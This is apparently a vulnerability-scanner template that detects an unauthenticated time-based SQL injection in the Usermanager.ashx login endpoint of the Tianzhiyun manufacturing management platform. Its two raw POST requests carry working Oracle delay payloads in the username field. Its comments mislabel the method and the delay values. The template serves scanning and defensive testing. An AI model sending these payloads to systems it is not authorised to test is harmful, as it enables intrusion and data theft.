id: tianzhiyun-Usermanager-sql-injection

info:
  name: "天智云智造管理平台 Usermanager.ashx SQL 时间延迟注入漏洞"
  author: Unknown
  severity: high
  description: |-
    body="Ashx/Usermanager.ashx"
    天智云智造管理平台 Usermanager.ashx 接口存在基于时间延迟的SQL注入漏洞。攻击者无需身份验证即可通过构造恶意SQL负载，触发数据库查询延时响应，从而推断数据库结构并提取敏感信息。该漏洞可能被利用实施权限提升、数据泄露及服务器控制等后续攻击，对系统完整性与机密性构成严重威胁。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484196&idx=1&sn=dda24010295bcfc008254c266736abe1&chksm=c267b617f5103f013d428a569d4df76a58a772f624e1689c9ee4a74a12875a25ea90d5d3b44e&token=1619136955&lang=zh_CN#rd
  tags: 天智云智造

http:
- raw:
  - |
    POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体1，请求1的延时设置为3
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Content-Type: application/x-www-form-urlencoded

    type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),4)--&pwd=1&vendor=

  - |
    POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体2，请求2的延时设置为6
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    X-Requested-With: XMLHttpRequest
    Content-Type: application/x-www-form-urlencoded

    type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),8)--&pwd=1&vendor=

  matchers-condition: and
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'        #请求1的延时>=3且<=4
    - 'duration_2>=8 && duration_2<=9'        #请求2的延时>=5且<=6
    condition: and
  - type: status
    status:
    - 200





